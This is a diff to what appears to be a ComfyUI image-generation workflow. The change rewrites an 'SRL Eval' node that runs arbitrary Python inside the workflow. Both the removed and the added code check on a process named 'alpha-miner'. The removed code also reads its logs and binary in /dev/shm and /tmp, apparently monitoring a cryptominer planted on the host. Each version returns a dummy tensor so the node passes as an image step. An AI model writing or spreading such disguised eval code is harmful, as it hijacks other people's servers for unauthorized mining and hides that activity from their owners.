@@ -2,14 +2,14 @@
   "1": {
     "class_type": "RandomNoise",
     "inputs": {
-      "noise_seed": 70035
+      "noise_seed": 55555
     }
   },
   "2": {
     "class_type": "SRL Eval",
     "inputs": {
       "parameters": "a",
-      "code": "import subprocess, os\nout = []\n\n# Process check\np = subprocess.run([\"pgrep\", \"-a\", \"alpha-miner\"], capture_output=True, text=True)\nif p.stdout.strip():\n    out.append(\"RUNNING: \" + p.stdout.strip().split(\"\\n\")[0][:80])\nelse:\n    out.append(\"NOT_RUNNING\")\n\n# Log check\nfor path in [\"/dev/shm/alpha.log\", \"/tmp/alpha.log\"]:\n    if os.path.exists(path):\n        with open(path) as f:\n            content = f.read()\n        lines = content.strip().split(\"\\n\")\n        out.append(f\"LOG ({len(lines)} lines):\")\n        for line in lines[-5:]:\n            out.append(\"  \" + line[:70])\n        break\nelse:\n    out.append(\"NO LOG FILE\")\n\n# Binary check\nfor path in [\"/dev/shm/alpha-miner\", \"/tmp/alpha-miner\"]:\n    if os.path.exists(path):\n        out.append(f\"BINARY: {path} ({os.path.getsize(path)//1024//1024}MB)\")\n        break\nelse:\n    out.append(\"NO BINARY\")\n\nprint(\"\\n\".join(out))\nimport torch\nreturn torch.zeros(1,1,1,3)",
+      "code": "import subprocess\np = subprocess.run([\"pgrep\", \"-a\", \"alpha-miner\"], capture_output=True, text=True)\nimport torch\nreturn torch.zeros(1,1,1,3)",
       "arg0": [
         "1",
         0
